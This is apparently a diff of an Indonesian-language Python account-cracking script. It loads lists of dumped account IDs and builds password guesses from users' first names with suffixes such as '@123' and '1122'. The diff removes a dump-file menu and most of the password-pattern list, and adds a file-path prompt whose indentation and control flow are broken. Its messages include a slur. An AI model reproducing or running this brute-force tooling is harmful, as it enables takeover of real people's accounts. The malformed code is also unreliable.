@@ -514,45 +514,13 @@ def grup1(urls):
 			lah()
 #-------------[ CRACK-FROM-FILE ]------------------#
 def crack_file():
-	try:vin = os.listdir('DUMP')
-	except FileNotFoundError:
-		print('➥➥➣File Tidak Ditemukan ')
-		time.sleep(2)
-		back()
-	if len(vin)==0:
-		print('➥➥➣Kamu Tidak Memiliki File Dump ')
-		time.sleep(2)
-		back()
-	else:
-		cih = 0
-		lol = {}
-		for isi in vin:
-			try:hem = open('DUMP/'+isi,'r').readlines()
-			except:continue
-			cih+=1
-			if cih<100:
-				nom = ''+str(cih)
-				lol.update({str(cih):str(isi)})
-				lol.update({nom:str(isi)})
-				print(f'➥➥➣%s. %s ({h} %s{u} idz )'%(nom,isi,len(hem)))
-			else:
-				lol.update({str(cih):str(isi)})
-				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
-				print('➥➥➣%s. %s ({h} %s {u}idz) '%(cih,isi,len(hem)))
-		geeh = input('\n➥➥➣select : ')
-		try:geh = lol[geeh]
-		except KeyError:
-			print(f'{k}➥➥➣select Yang Bener Kontol {u}')
-			time.sleep(3)
-			back()
-		try:lin = open('DUMP/'+geh,'r').read().splitlines()
-		except:
-			print('➥➥➣File Tidak Ditemukan, Coba Lagi Nanti ')
-			time.sleep(2)
-			back()
-		for xid in lin:
-			id.append(xid)
-		setting()
+	fileX = input (' [\x1b[38;5;46m>>\33[m] Enter file path : ') 
+				for line in open(fileX, 'r').readlines():
+					id.append(line.strip())
+				setting()
+			
+				exit("\n [!] file %s not found"%(fileX))
+				########except FileNotFoundError:exit(f" [>] File does not exist")
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
 	cetak(nel('\t[bold cyan]         • WHICH ACCOUNT YOU WANT • [/bold cyan]'))
@@ -644,43 +612,7 @@ def passwrd():
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
-					pwv.append(frs+'@12345')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@@#')  
-					pwv.append(frs+'@1234')
-					pwv.append(frs+'123@@')
-					pwv.append(frs+'@12346')
-					pwv.append(frs+'1234')
-					pwv.append(nmf+'123')                                   
-					pwv.append(frs+'123@')
-					pwv.append(frs+'123@#')
-					pwv.append('123'+frs)
-					pwv.append(frs+'@1122')
-					pwv.append(frs+'122')
-					pwv.append('#'+frs)
-					pwv.append(frs+'321@')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'98')
-					pwv.append(frs+'@#')
-					pwv.append('@'+frs+'123')
-					pwv.append(frs+'321')
-					pwv.append('@123'+frs)
-					pwv.append(frs+'54321')
-					pwv.append(frs+'456')
-					pwv.append(frs+'@@')
-					pwv.append(frs+'#123')
-					pwv.append(frs+'don')
-					pwv.append(frs+'99')
-					pwv.append(frs+'@')
-					pwv.append(nmf+'123#')
-					pwv.append(frs+'098')
-					pwv.append('@'+frs)
-					pwv.append(frs+'vai')
-					pwv.append(frs+'9800')
-					pwv.append(frs+'$123')
-					pwv.append(frs+'980')       	                                                                      
-					pwv.append('#'+frs+'123')
+					
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
